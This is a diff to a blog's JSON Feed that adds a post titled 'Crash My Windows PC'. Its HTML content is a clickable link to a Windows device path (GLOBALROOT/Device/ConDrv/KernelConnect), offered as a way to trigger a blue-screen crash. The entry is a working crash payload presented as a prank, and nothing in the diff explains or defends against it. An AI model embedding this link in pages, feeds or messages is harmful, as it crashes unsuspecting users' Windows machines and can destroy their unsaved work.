@@ -10,6 +10,20 @@
     },
     "items": [
         {
+            "id": "https://ccxfied.github.io/crash-my-windows-pc.html",
+            "url": "https://ccxfied.github.io/crash-my-windows-pc.html",
+            "title": "Crash My Windows PC",
+            "summary": "Click me to BSOD",
+            "content_html": "<p><a href=\"file:///./GLOBALROOT/Device/ConDrv/KernelConnect\">Click me to BSOD</a></p>",
+            "author": {
+                "name": "Cortex Cortexified"
+            },
+            "tags": [
+            ],
+            "date_published": "2021-03-12T10:13:07+05:30",
+            "date_modified": "2021-03-12T10:13:07+05:30"
+        },
+        {
             "id": "https://ccxfied.github.io/qualcomm-snapdragon-865-4.html",
             "url": "https://ccxfied.github.io/qualcomm-snapdragon-865-4.html",
             "title": "Qualcomm Snapdragon 855+",
